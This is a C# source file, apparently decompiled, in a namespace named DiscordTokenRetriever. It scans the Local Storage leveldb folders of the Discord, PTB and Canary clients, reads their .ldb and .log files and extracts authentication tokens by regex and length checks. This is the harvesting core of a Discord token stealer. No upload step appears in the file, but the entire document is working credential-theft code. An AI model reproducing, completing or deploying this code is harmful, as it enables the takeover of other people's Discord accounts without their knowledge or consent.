﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace DiscordTokenRetriever
{
	// Token: 0x02000006 RID: 6
	public class TokenRetriever
	{
		// Token: 0x0600000B RID: 11 RVA: 0x000020C8 File Offset: 0x000002C8
		private static List<string> ReadAllLines(string file)
		{
			List<string> list = new List<string>();
			using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
				{
					while (streamReader.Peek() >= 0)
					{
						list.Add(streamReader.ReadLine());
					}
				}
			}
			return list;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000213C File Offset: 0x0000033C
		private static string TokenRegexCheck(string line)
		{
			foreach (object obj in TokenRetriever.tokenRegex.Matches(line))
			{
				string value = ((Match)obj).Groups[0].Value;
				if (value.Length == 59 || value.Length == 88)
				{
					return value;
				}
			}
			return "";
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000021C4 File Offset: 0x000003C4
		private static string PerformTokenCheck(string line)
		{
			if (line.Contains("[oken"))
			{
				return TokenRetriever.TokenRegexCheck(line);
			}
			if (line.Contains(">oken"))
			{
				return TokenRetriever.TokenRegexCheck(line);
			}
			if (line.Contains("token>"))
			{
				foreach (object obj in TokenRetriever.tokenRegex.Matches(line))
				{
					Match match = (Match)obj;
					if (match.Length >= 59)
					{
						return match.Value;
					}
				}
			}
			return "";
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000226C File Offset: 0x0000046C
		public static List<string> RetrieveDiscordTokens()
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>(new string[]
			{
				TokenRetriever.discordTokenDirectory,
				TokenRetriever.ptbTokenDirectory,
				TokenRetriever.canaryTokenDirectory
			});
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				if (Directory.Exists(path))
				{
					IEnumerable<string> collection = from specifiedFile in Directory.EnumerateFiles(path)
					where specifiedFile.EndsWith(".ldb") || specifiedFile.EndsWith(".log")
					select specifiedFile;
					list3.AddRange(collection);
				}
			}
			foreach (string file in list3)
			{
				foreach (string line in TokenRetriever.ReadAllLines(file))
				{
					if (!(TokenRetriever.PerformTokenCheck(line) == ""))
					{
						list.Add(TokenRetriever.PerformTokenCheck(line));
					}
				}
			}
			return list;
		}

		// Token: 0x04000004 RID: 4
		private static readonly string tokenFileDirectory = "\\Local Storage\\leveldb";

		// Token: 0x04000005 RID: 5
		private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000006 RID: 6
		private static readonly string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000007 RID: 7
		public static readonly string temporaryDirectoryPath = Path.Combine(TokenRetriever.localAppDataPath, "\\temp");

		// Token: 0x04000008 RID: 8
		public static readonly string discordTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "Discord" + TokenRetriever.tokenFileDirectory);

		// Token: 0x04000009 RID: 9
		public static readonly string ptbTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "discordptb" + TokenRetriever.tokenFileDirectory);

		// Token: 0x0400000A RID: 10
		public static readonly string canaryTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "discordcanary" + TokenRetriever.tokenFileDirectory);

		// Token: 0x0400000B RID: 11
		private static readonly Regex tokenRegex = new Regex("([A-Za-z0-9_\\./\\\\-]*)");
	}
}
